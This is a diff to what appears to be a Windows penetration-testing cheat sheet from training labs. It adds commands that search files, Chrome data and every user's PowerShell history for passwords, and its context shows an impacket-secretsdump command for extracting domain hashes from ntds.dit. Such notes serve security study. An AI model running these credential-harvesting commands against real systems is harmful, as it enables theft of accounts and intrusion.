@@ -136,9 +136,13 @@ sc start servicename
 shutdown /r /t 0
 ```
 
-### Powershell history
+### Credential Hunt
 ```
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+unattend.xml
 (Get-PSReadlineOption).HistorySavePath
+foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
 ```
 
 ### Firewall
@@ -664,10 +668,6 @@ Invoke-AllChecks
 ### ntds.dit
 ```
 impacket-secretsdump -ntds /home/kali/Desktop/Active\ Directory/ntds.dit -system /home/kali/Desktop/registry/SYSTEM local
-```
-### Check Compressed files
-```
-check zip,gz,7z,stix,rar files
 ```
 ### Powershell to get interactive shell as another user
 ```
